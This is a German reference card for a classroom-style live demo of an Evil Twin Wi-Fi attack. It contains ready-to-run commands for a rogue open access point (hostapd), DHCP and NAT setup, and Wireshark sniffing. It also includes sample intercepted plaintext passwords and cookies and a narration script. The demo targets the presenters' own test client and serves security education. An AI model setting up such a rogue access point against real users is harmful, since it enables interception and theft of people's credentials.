# Evil Twin - Live Demo Referenzkarte
## Schnelle Kommando-Übersicht für die Präsentation

---

## 🎬 DEMO VORBEREITUNG (VOR der Präsentation)

```bash
# 1. Kali Linux öffnen (oder virtuelle Maschine starten)
# 2. Terminal öffnen

# Prüfen, ob WLAN-Adapter vorhanden:
iwconfig
# Sollte ungefähr so aussehen:
# wlan0     IEEE 802.11  ... 
#           Mode:Managed
```

---

## 🚀 SCHRITT-FÜR-SCHRITT LIVE DEMO

### TERMINAL 1: WLAN Adapter in Monitor-Modus versetzen

```bash
# Wireless Interface ermitteln
ip link show

# Monitor Mode einschalten (braucht sudo)
sudo ip link set wlan0 down
sudo iw wlan0 set type monitor
sudo ip link set wlan0 up

# Bestätigung:
iw wlan0 info
# "type: monitor" sollte erscheinen
```

### TERMINAL 2: Verfügbare WLANs scannen (Optional)

```bash
# Mit airodump-ng
sudo airodump-ng wlan0

# Nach ~10 Sekunden:
# - Zielgerät suchen (z.B. "FreeAirport_Wifi")
# - BSSID notieren
# - Channel notieren (z.B. 6)
# STRG+C zum beenden
```

### TERMINAL 1: Evil Twin Access Point starten

```bash
# Hostapd Konfiguration (sollte vorbereitet sein)
# Datei: /etc/hostapd/hostapd.conf
# Inhalt (anpassen!):
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeAirport_Wifi
hw_mode=g
channel=6
wmm_enabled=0
auth_algs=1
wpa=0
EOF

# Evil Twin starten
sudo hostapd /tmp/hostapd.conf

# Output sollte sein:
# wlan0: AP-ENABLED
```

### TERMINAL 2 (NEU): DHCP Server starten

```bash
# IP-Adresse für AP setzen
sudo ip addr add 192.168.100.1/24 dev wlan0

# DHCP Server starten (dnsmasq)
sudo dnsmasq --interface=wlan0 --dhcp-range=192.168.100.50,192.168.100.150,255.255.255.0 --no-daemon

# Oder wenn dnsmasq installiert ist:
# sudo service dnsmasq start
```

### TERMINAL 3: Wireshark öffnen & Traffic sniffin

```bash
# Wireshark mit GUI starten
sudo wireshark &

# In Wireshark:
# 1. Interface "wlan0" auswählen
# 2. "Start Capture" klicken
# 3. Filter setzen:
#    http
#    oder: tcp.port==80 or tcp.port==443
# 4. BEOBACHTEN - wenn Client sich verbindet und HTTP öffnet:
#    - GET Requests erscheinen
#    - Credentials im Klartext sichtbar!

# Pro Tipp: Nur HTTP filtern für bessere Demo
# Filter: http.request
```

### TERMINAL 4 (OPTIONAL): NAT für echten Internet-Zugang

```bash
# Falls Clients echtes Internet brauchen:
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT

# IPv4 Forwarding enable:
sudo sysctl net.ipv4.ip_forward=1
```

---

## 📱 TEST-CLIENT VERBINDUNG

### Virtueller Client auf GLEICHER MASCHINE

```bash
# In Virtual Machine oder zweitem Gerät:
# 1. Netzwerk-Liste öffnen
# 2. "FreeAirport_Wifi" suchen
# 3. Verbinden (kein Passwort nötig!)
# 4. IP-Adresse sollte 192.168.100.x sein:
#    ipconfig (Windows)
#    ifconfig (Linux/Mac)

# Browser öffnen: http://example.com
# (WICHTIG: http:// NICHT https://)
# In Wireshark müssten jetzt Pakete erscheinen!
```

---

## 🔍 WIRESHARK TRAFFIC-ANALYSE

### Was man in Wireshark sieht:

```
Paket 1:
  Source: 192.168.100.100 (Test Client)
  Dest:   8.8.8.8 (Google DNS)
  Protocol: DNS
  Query: "google.com"

Paket 2:
  Source: 192.168.100.100
  Dest:   142.251.41.14 (Google Server)
  Protocol: HTTP
  Request: GET / HTTP/1.1
  Host: google.com
  User-Agent: Mozilla/5.0 ...

Paket 3:
  Source: 142.251.41.14
  Dest:   192.168.100.100
  Protocol: HTTP
  Response: 200 OK
  Content-Type: text/html
  <HTML CONTENT HIER SICHTBAR!>
```

### Sensible Daten in HTTP

```
Login-Versuche:
  POST /login HTTP/1.1
  ...
  username=admin&password=SuperSecret123

Cookies:
  Cookie: session_id=abc123def456xyz789

E-Mail Abfragen:
  IMAP/SMTP Credentials im Klartext!

Chats:
  Message text visible
```

### HTTPS vs HTTP

```
HTTP Traffic:
  Readable
  Content Type: text/html
  Alles sichtbar

HTTPS Traffic:
  Packet Data: [encrypted binary gibberish]
  Content Type: (nicht sichtbar)
  Nur Domain erkennbar (SNI)
```

---

## ⚠️ WENN ETWAS NICHT FUNKTIONIERT

### Problem: Keine Pakete in Wireshark

```bash
# 1. Prüfen ob wlan0 im Monitor Mode ist:
iw wlan0 info
# Sollte zeigen: "type: monitor"

# 2. Prüfen ob hostapd läuft:
ps aux | grep hostapd

# 3. Interface neustarten:
sudo ip link set wlan0 down
sudo ip link set wlan0 up
```

### Problem: Client kann sich nicht verbinden

```bash
# 1. Prüfen ob DHCP Server läuft:
ps aux | grep dnsmasq

# 2. IP-Range prüfen:
ip addr show wlan0
# Sollte zeigen: 192.168.100.1/24

# 3. Firewall deaktivieren (temporär):
sudo ufw disable  # Ubuntu
sudo systemctl stop firewalld  # Fedora/CentOS
```

### Problem: Keine Internet-Verbindung für Clients

```bash
# 1. NAT nicht aktiviert? Aktivieren:
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# 2. IP Forwarding nicht aktiviert:
sudo sysctl net.ipv4.ip_forward=1

# 3. DNS nicht funktioniert:
# Im Client: nslookup google.com
# Sollte Antwort bekommen
```

---

## 🛑 DEMO BEENDEN

```bash
# Im hostapd Terminal: STRG+C

# Im dnsmasq Terminal: STRG+C

# Wireshark: Datei > Schließen

# Adapter zurück zu Managed Mode:
sudo ip link set wlan0 down
sudo iw wlan0 set type managed
sudo ip link set wlan0 up
```

---

## 📸 SCREENSHOTS FÜR BACKUP

Wenn die Live Demo crashed (passiert!), habt ihr Backups:

```bash
# Screenshots machen:
1. Wireshark mit HTTP Daten
2. Terminal Output von hostapd
3. DHCP Server Output
4. nmap Scan zeigt den AP
```

Speichert diese als PDF/Bilder und habt sie als Fallback!

---

## 🎓 DEMO-NARRATIVE (Was ihr sagt)

```
"Hier sehen wir die Live-Demonstration von Evil Twin.

Der Laptop oben links ist der Angreifer - hier läuft der 
Rogue Access Point "FreeAirport_Wifi".

Das Handy hier (oder VM rechts) ist der ahnungslose Client.

Jetzt verbindet sich der Client ... und hier sehen wir in Wireshark,
dass der Traffic durch unseren Computer fließt. Wir sehen nicht nur
dass der Client auf Google zugreift, sondern wir sehen auch JEDES
Passwort, das der Nutzer versucht.

Wenn der Nutzer sein Gmail öffnet und sich anmeldet - 
wir sehen es. ALLES.

Das ist die Macht und die GEFAHR von Evil Twin."
```

---

## ✅ CHECKLISTE LIVE DEMO

- [ ] Kali Linux startet
- [ ] WLAN Adapter funktioniert
- [ ] hostapd startet ohne Fehler
- [ ] dnsmasq startet ohne Fehler
- [ ] Wireshark öffnet und zeigt wlan0
- [ ] Test-Client kann sich verbinden
- [ ] Wireshark zeigt HTTP Traffic
- [ ] Passwörter sind sichtbar
- [ ] HTTPS Traffic ist verschlüsselt
- [ ] Alles läuft ohne Abstürze

---

## 🔧 WICHTIGSTE KOMMANDOS ZUSAMMENGEFASST

```bash
# SETUP (einmalig)
sudo ip link set wlan0 down
sudo iw wlan0 set type monitor
sudo ip link set wlan0 up

# START (bei jedem Demo-Durchlauf)
sudo hostapd /tmp/hostapd.conf &        # Terminal 1
sudo ip addr add 192.168.100.1/24 dev wlan0
sudo dnsmasq --interface=wlan0 --dhcp-range=192.168.100.50,192.168.100.150,255.255.255.0 &  # Terminal 2
sudo wireshark &                         # Terminal 3

# STOP (Cleanup)
pkill hostapd
pkill dnsmasq
# Reset wlan0:
sudo ip link set wlan0 down
sudo iw wlan0 set type managed
sudo ip link set wlan0 up
```

---

**VIEL ERFOLG BEI DER DEMO!** 🚀

*Bei Fragen: Google/Stack Overflow sind deine Freunde*
*Alles möglichst 24h vor Präsentation testen!*
